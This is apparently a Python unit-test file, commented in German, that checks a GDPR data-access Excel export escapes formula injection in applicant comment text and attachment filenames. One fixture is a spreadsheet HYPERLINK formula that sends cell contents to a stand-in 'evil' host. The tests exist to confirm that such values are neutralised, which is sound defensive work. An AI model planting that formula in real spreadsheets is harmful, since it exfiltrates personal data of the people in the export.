"""Formula-Injection-Schutz für die DSGVO-Auskunft-Zusatzblätter (AUD-015).

Der modul-lokale :func:`app.modules.privacy.service.build_auskunft_workbook`
ergänzt die geteilte Basis-Mappe um zwei Blätter (**Kommentare**, **Anhänge**)
mit hochgradig angreiferkontrollierten Daten: ``Comment.body`` ist
antragstellerseitiger Rohtext (öffentliche Kommentare via Magic-Link, keine
Sanitisierung), ``Attachment.filename`` behält führende ``-``/``+``/``@``.
Diese Zellen müssen — wie die Basis-Blätter — durch ``app.shared.xlsx._safe``
laufen, damit Excel/LibreOffice sie nicht als aktive Formel auswerten.

Reine Unit-Tests (kein DB/Docker/Netz)."""

from __future__ import annotations

from datetime import UTC, datetime
from io import BytesIO
from typing import Any
from uuid import uuid4

from openpyxl import load_workbook

from app.modules.privacy.service import build_auskunft_workbook
from app.shared.xlsx import _FORMULA_PREFIXES

_AT = datetime(2026, 6, 21, 9, 30, 0, tzinfo=UTC)


def _load(data: bytes) -> Any:
    return load_workbook(BytesIO(data))


def test_auskunft_escapes_comment_body() -> None:
    payload = '=HYPERLINK("http://evil/?"&A1,"x")'
    data = build_auskunft_workbook(
        email="user@example.org",
        applications=[],
        versions=[],
        principal=None,
        comments=[
            {
                "applicationId": uuid4(),
                "authorKind": "applicant",
                "visibility": "public",
                "body": payload,
                "at": _AT,
            }
        ],
        attachments=[],
    )
    ws = _load(data)["Kommentare"]
    # Spalte 5 = "Text" (Comment.body) in der ersten Datenzeile.
    body_cell = ws.cell(row=2, column=5).value
    assert body_cell == "'" + payload
    # Keine Zelle der Zeile darf als aktive Formel persistiert sein.
    for col in range(1, 6):
        val = ws.cell(row=2, column=col).value
        assert not (isinstance(val, str) and val[:1] in _FORMULA_PREFIXES)


def test_auskunft_escapes_attachment_filename() -> None:
    # sanitize_filename behält führende '-'/'+'/'@' → live-Formel-Gefahr.
    filename = "-1+1.pdf"
    data = build_auskunft_workbook(
        email="user@example.org",
        applications=[],
        versions=[],
        principal=None,
        comments=[],
        attachments=[
            {
                "applicationId": uuid4(),
                "filename": filename,
                "mime": "@text/plain",
                "size": 12,
                "createdAt": _AT,
            }
        ],
    )
    ws = _load(data)["Anhänge"]
    # Spalte 2 = "Dateiname", Spalte 3 = "Typ".
    name_cell = ws.cell(row=2, column=2).value
    mime_cell = ws.cell(row=2, column=3).value
    assert name_cell == "'" + filename
    assert mime_cell == "'@text/plain"
    for col in range(1, 6):
        val = ws.cell(row=2, column=col).value
        assert not (isinstance(val, str) and val[:1] in _FORMULA_PREFIXES)
